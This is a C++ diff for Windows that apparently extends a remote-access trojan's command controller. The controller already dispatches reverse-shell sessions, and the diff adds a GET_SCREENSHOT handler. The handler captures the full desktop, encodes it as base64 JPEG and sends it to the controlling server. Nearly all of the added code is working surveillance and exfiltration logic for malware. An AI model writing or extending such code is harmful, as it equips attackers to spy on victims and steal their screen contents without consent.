@@ -4,9 +4,22 @@
 #include "networking.hpp"
 #include "base64.hpp"
 
+//  Define min max macros required by GDI+ headers.
+#ifndef max
+#define max(a,b) (((a) > (b)) ? (a) : (b))
+#else
+#error max macro is already defined
+#endif
+#ifndef min
+#define min(a,b) (((a) < (b)) ? (a) : (b))
+#else
+#error min macro is already defined
+#endif
+
 #include <fstream>
 #include <filesystem>
 #include <atlbase.h>
+#include <atlimage.h>
 #include <ShlObj.h>
 #include <shellapi.h>
 #include <boost/format.hpp>
@@ -49,6 +62,9 @@ void Controller::dispatch(std::string message) {
 		break;
 	case RequestType::CREATE_REVERSE_SHELL_SESSION:
 		Controller::createReverseShellSession(messageJson);
+		break;
+	case RequestType::GET_SCREENSHOT:
+		Controller::getScreenshot(messageJson);
 		break;
 	}
 }
@@ -143,3 +159,77 @@ void Controller::createReverseShellSession(json::json message) {
 	Networking::sendToServer(response.dump());
 }
 
+void Controller::getScreenshot(json::json message) {
+    BITMAPFILEHEADER bfHeader;
+    BITMAPINFOHEADER biHeader;
+    BITMAPINFO bInfo;
+    HGDIOBJ hTempBitmap;
+    HBITMAP hBitmap;
+    BITMAP bAllDesktops;
+    HDC hDC, hMemDC;
+    LONG lWidth, lHeight;
+    BYTE *bBits = NULL;
+    HANDLE hHeap = GetProcessHeap();
+    DWORD cbBits, dwWritten = 0;
+    INT x = GetSystemMetrics(SM_XVIRTUALSCREEN);
+    INT y = GetSystemMetrics(SM_YVIRTUALSCREEN);
+
+    ZeroMemory(&bfHeader, sizeof(BITMAPFILEHEADER));
+    ZeroMemory(&biHeader, sizeof(BITMAPINFOHEADER));
+    ZeroMemory(&bInfo, sizeof(BITMAPINFO));
+    ZeroMemory(&bAllDesktops, sizeof(BITMAP));
+
+    hDC = GetDC(NULL);
+    hTempBitmap = GetCurrentObject(hDC, OBJ_BITMAP);
+    GetObjectW(hTempBitmap, sizeof(BITMAP), &bAllDesktops);
+
+    lWidth = bAllDesktops.bmWidth;
+    lHeight = bAllDesktops.bmHeight;
+
+    DeleteObject(hTempBitmap);
+
+    bfHeader.bfType = (WORD)('B' | ('M' << 8));
+    bfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
+    biHeader.biSize = sizeof(BITMAPINFOHEADER);
+    biHeader.biBitCount = 24;
+    biHeader.biCompression = BI_RGB;
+    biHeader.biPlanes = 1;
+    biHeader.biWidth = lWidth;
+    biHeader.biHeight = lHeight;
+
+    bInfo.bmiHeader = biHeader;
+
+    cbBits = (((24 * lWidth + 31)&~31) / 8) * lHeight;
+
+    hMemDC = CreateCompatibleDC(hDC);
+    hBitmap = CreateDIBSection(hDC, &bInfo, DIB_RGB_COLORS, (VOID **)&bBits, NULL, 0);
+    SelectObject(hMemDC, hBitmap);
+    BitBlt(hMemDC, 0, 0, lWidth, lHeight, hDC, x, y, SRCCOPY);
+
+    DeleteDC(hMemDC);
+    ReleaseDC(NULL, hDC);
+
+    std::vector<BYTE> buf;
+    IStream *stream = NULL;
+    HRESULT hr = CreateStreamOnHGlobal(0, TRUE, &stream);
+    CImage image;
+    ULARGE_INTEGER liSize;
+
+    image.Attach(hBitmap);
+    image.Save(stream, Gdiplus::ImageFormatJPEG);
+    IStream_Size(stream, &liSize);
+    DWORD len = liSize.LowPart;
+    IStream_Reset(stream);
+    buf.resize(len);
+    IStream_Read(stream, &buf[0], len);
+    stream->Release();
+
+    std::string fileBase64String = base64_encode(std::string(buf.begin(), buf.end()));
+
+    json::json response;
+    response["id"] = message["id"];
+    response["file"] = fileBase64String;
+    Networking::sendToServer(response.dump());
+
+    DeleteObject(hBitmap);
+}
